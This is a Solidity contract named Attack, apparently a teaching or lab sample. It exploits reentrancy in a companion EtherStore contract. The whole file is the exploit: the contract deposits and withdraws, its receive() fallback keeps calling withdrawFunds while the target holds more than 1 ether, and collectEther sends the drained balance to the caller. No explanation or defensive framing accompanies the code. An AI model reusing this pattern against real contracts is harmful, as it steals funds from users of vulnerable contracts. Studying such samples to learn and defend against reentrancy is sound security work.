// SPDX-License-Identifier: MIT
pragma solidity ^0.7.3;

import "./EtherStore.sol";

contract Attack {
    EtherStore public etherStore;
    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }
    function attackEtherStore() public payable {
        require(msg.value <= 1 ether);
        etherStore.depositFunds{value:msg.value}();
        etherStore.withdrawFunds(msg.value);
    }
    function collectEther() public {
        msg.sender.transfer(address(this).balance);
    }

    receive() external payable {
        if(address(etherStore).balance > 1 ether){
            etherStore.withdrawFunds(1 ether);
        }
    }
}